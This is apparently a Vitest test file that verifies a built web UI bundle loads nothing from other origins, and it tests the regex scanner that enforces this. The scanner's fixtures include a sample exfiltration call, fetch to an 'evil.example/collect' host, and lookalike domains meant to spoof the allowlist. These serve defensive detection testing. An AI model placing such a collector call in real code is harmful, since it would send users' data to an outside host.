// Offline tier: the BUILT bundle (tests/setup/build.ts builds it) reaches nothing outside this origin, and the scanner
// that says so is itself shown to catch each way a remote dependency sneaks in.
import { existsSync, readFileSync, readdirSync, statSync } from 'node:fs';
import { extname, join, relative, resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import { UI_ROOT } from '../helpers/themes';

const DIST = join(UI_ROOT, 'dist');
// Loadable and executable types only: the license texts in licenses/ (.txt, .md) quote upstream project URLs as prose and are never fetched.
const TEXT = new Set(['.html', '.css', '.js', '.svg', '.webmanifest', '.json']);

/** Host-less XML namespace identifiers (never fetched) and React's production error-message text (never fetched). */
const ALLOWED_URL = [/^http:\/\/www\.w3\.org\/(?:2000\/svg|1999\/xlink|1999\/xhtml|XML\/1998\/namespace|1998\/Math\/MathML)\/?$/, /^https:\/\/react\.dev\/errors\/?$/];

export interface Finding {
  file: string;
  what: string;
}

/** Every way a text file can name another origin: absolute URLs, protocol-relative URLs in url()/src/href/@import. */
export function scanForRemote(file: string, text: string): Finding[] {
  const out: Finding[] = [];
  for (const m of text.matchAll(/(?:https?|wss?|ftp):\/\/[^\s"'`)<>\\]+/gi)) {
    const url = m[0].replace(/[.,;]+$/, '');
    if (!ALLOWED_URL.some((re) => re.test(url))) out.push({ file, what: url });
  }
  for (const m of text.matchAll(/@import\s*(?:url\()?\s*["']?(?:https?:)?\/\//gi)) out.push({ file, what: m[0] });
  for (const m of text.matchAll(/(?:url\(|\bsrc\s*=|\bhref\s*=)\s*["']?\/\/[^\s"')]+/gi)) out.push({ file, what: m[0] });
  return out;
}

function walk(dir: string): string[] {
  return readdirSync(dir).flatMap((f) => {
    const p = join(dir, f);
    return statSync(p).isDirectory() ? walk(p) : [p];
  });
}

describe('the scanner', () => {
  it('flags a CDN font, a remote @import, a protocol-relative url and a websocket, and lets the namespace ids through', () => {
    const bad = [
      '<link href="https://fonts.googleapis.com/css2?family=Inter" rel="stylesheet">',
      '@import url(https://fonts.googleapis.com/css2);',
      "@import 'https://cdn.example/x.css';",
      '@font-face{src:url(//fonts.gstatic.com/s/inter.woff2)}',
      '<script src="//cdn.example/x.js"></script>',
      'new WebSocket("wss://stream.example/x")',
      'fetch("http://evil.example/collect")',
    ];
    for (const b of bad) expect(scanForRemote('x', b).length, b).toBeGreaterThan(0);
    expect(scanForRemote('x', '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">')).toEqual([]);
    expect(scanForRemote('x', 'see https://react.dev/errors/')).toEqual([]);
    expect(scanForRemote('x', 'see https://react.dev.evil.example/errors/')).not.toEqual([]);
    expect(scanForRemote('x', 'http://www.w3.org.evil.example/2000/svg')).not.toEqual([]);
  });
});

describe('build output is self-contained', () => {
  const files = existsSync(DIST) ? walk(DIST) : [];

  it('the build produced html, css, js and woff2 files', () => {
    const exts = new Set(files.map((f) => extname(f)));
    for (const e of ['.html', '.css', '.js', '.woff2', '.svg', '.png']) expect(exts.has(e), e).toBe(true);
  });

  it('no html/css/js/svg/manifest names another origin (no CDN, no remote font, no remote import)', () => {
    const findings = files.filter((f) => TEXT.has(extname(f))).flatMap((f) => scanForRemote(relative(DIST, f), readFileSync(f, 'utf8')));
    expect(findings).toEqual([]);
  });

  it('every url() in the css is local and exists, and every @font-face source is a bundled woff2', () => {
    const cssFiles = files.filter((f) => f.endsWith('.css'));
    expect(cssFiles.length).toBeGreaterThan(0);
    let fontFaces = 0;
    for (const f of cssFiles) {
      const css = readFileSync(f, 'utf8');
      for (const m of css.matchAll(/url\(\s*["']?([^"')]+)["']?\s*\)/g)) {
        const u = m[1] as string;
        expect(u, u).not.toMatch(/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i); // no scheme (so no data: either), no protocol-relative
        const target = u.startsWith('/') ? join(DIST, u) : resolve(join(f, '..'), u.split(/[?#]/)[0] as string);
        expect(existsSync(target.split(/[?#]/)[0] as string), `${u} does not exist in dist`).toBe(true);
      }
      for (const block of css.matchAll(/@font-face\s*{[^}]*}/g)) {
        fontFaces++;
        const srcs = [...(block[0].matchAll(/url\(\s*["']?([^"')]+)["']?\s*\)/g))].map((m) => m[1] as string);
        expect(srcs.length).toBeGreaterThan(0);
        for (const s of srcs) expect(s.split(/[?#]/)[0]).toMatch(/\.woff2$/);
        expect(block[0]).not.toMatch(/local\(/);
      }
    }
    expect(fontFaces).toBe(7); // orbitron x1, inter x2, jetbrains-mono x2, fraunces x2
  });

  it('index.html references only same-origin absolute paths', () => {
    const html = readFileSync(join(DIST, 'index.html'), 'utf8');
    const refs = [...html.matchAll(/\b(?:src|href)="([^"]+)"/g)].map((m) => m[1] as string);
    expect(refs.length).toBeGreaterThan(5);
    for (const r of refs) {
      expect(r, r).toMatch(/^\/(?!\/)/);
      expect(existsSync(join(DIST, r.split(/[?#]/)[0] as string)), `${r} missing from dist`).toBe(true);
    }
  });

  it('every font file is a real woff2 (magic number), and none is an HTML error page saved under a font name', () => {
    for (const f of files.filter((x) => x.endsWith('.woff2'))) expect(readFileSync(f).subarray(0, 4).toString('latin1'), f).toBe('wOF2');
  });

  it('the app source declares no remote font or script anywhere (not just in the build)', () => {
    const src = walk(join(UI_ROOT, 'src')).concat(join(UI_ROOT, 'index.html')).filter((f) => /\.(tsx?|css|html)$/.test(f) && !f.endsWith('schema.d.ts'));
    const findings = src.flatMap((f) => scanForRemote(relative(UI_ROOT, f), readFileSync(f, 'utf8'))).filter((x) => !/w3\.org/.test(x.what));
    expect(findings).toEqual([]);
  });
});
